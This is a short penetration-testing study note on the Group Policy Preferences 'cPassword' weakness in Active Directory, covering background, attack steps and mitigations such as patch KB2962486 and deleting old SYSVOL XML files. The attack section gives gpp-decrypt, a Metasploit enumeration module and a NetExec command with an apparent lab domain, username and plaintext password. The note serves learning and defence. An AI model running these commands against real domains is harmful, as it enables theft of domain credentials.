## Background
- Group Policy Preferences (GPP) allowed admins to create policies with embedded credentials.
- These credentials were encrypted and placed in a “cPassword”, the key was accidentally released, allowing these “cPassword” to be decrypted.
- Location of these GPP files are within the **SYSVOL of the DC.**
- Patch is MS14-025 but it **doesn’t prevent previous uses**, may still be relevant.
- Should be in the Groups.xml file
## Attack
Locate the GPP file in the SYSVOL, could be in other Groups directories.

- Decrypting the cpassword
```powershell
gpp-decrypt <enc pass>
```
- Metasploit automated enumeration and decryption
```powershell
auxiliary/scanner/smb/smb_enum_gpp
```
- NXC GPP PASSWORD
```bash
nxc smb targets.txt -d hack-academy.local -u lbennett -p '!!reiD123' -M gpp_password
```
## Mitigations

- Already patched! Fixed in KB2962486
- Delete the old GPP xml files stored in the SYSVOL